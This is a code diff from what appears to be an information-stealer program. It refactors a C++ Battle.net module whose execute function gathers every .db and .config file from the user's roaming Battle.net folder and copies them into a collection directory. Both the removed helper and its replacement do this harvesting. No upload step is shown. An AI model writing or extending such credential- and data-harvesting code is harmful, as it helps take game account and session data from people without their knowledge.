@@ -7,7 +7,12 @@
 static const fs::path BATTLE_NET_PATH = Utils::getRoamingPath() / "Battle.net";
 
 void BattleNet::execute(fs::path &root) {
-    std::vector<fs::path> paths = BattleNet::battlenetFiles();
+    std::vector<fs::path> paths = FilesUtil::scanDirectory(BATTLE_NET_PATH, [](const fs::path &path) {
+        std::string extension = path.extension().string();
+        extension.erase(0, 1);
+
+        return extension == "db" || extension == "config";
+    });
 
     if(paths.empty())
         return;
@@ -19,25 +24,4 @@ void BattleNet::execute(fs::path &root) {
     {
         Utils::copy(path, dst);
     }
-}
-
-std::vector<fs::path> BattleNet::battlenetFiles() {
-    std::vector<fs::path> paths;
-    try
-    {
-        for (const auto& entry : fs::directory_iterator(BATTLE_NET_PATH)) {
-            const fs::path& item_path = entry.path();
-
-            std::string extension = item_path.extension().string();
-            extension.erase(0, 1);
-
-            if(!(extension == "db" || extension == "config"))
-                continue;
-
-            paths.push_back(item_path);
-        }
-    }
-    catch (const fs::filesystem_error& ignored) {}
-
-    return paths;
 }
